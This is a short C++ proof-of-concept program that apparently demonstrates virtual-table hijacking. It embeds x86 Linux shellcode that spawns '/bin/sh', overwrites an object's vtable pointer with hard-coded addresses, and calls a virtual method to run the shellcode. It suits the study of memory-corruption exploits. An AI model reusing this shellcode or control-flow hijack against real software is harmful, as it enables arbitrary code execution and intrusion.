#include <iostream>
#include <unistd.h>
#include <string.h>

using namespace std;

char shellcode[] = "\x00\x00\x00\x00\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80";

class TestClass
{
public:
	char buf[40];
	virtual void test()
	{
		cout << "In TestClass::test()\n" << endl;
	}
};

TestClass overflow, *p;

int main()
{
	cout << "shellcode's address: " << &shellcode << endl;
        /*change as the correct shellcode's address*/
	shellcode[0] = 0x60;
	shellcode[1] = 0x9c;
        shellcode[2] = 0x04;
	shellcode[3] = 0x08;
	char *p_vtable;
	p_vtable = (char*)&overflow;  //point to virtual table
        
	p_vtable[0] = 0x5c;
	p_vtable[1] = 0x9c;
	p_vtable[2] = 0x04;
	p_vtable[3] = 0x08;
	p = &overflow;
	p->test();

	return 0;
}
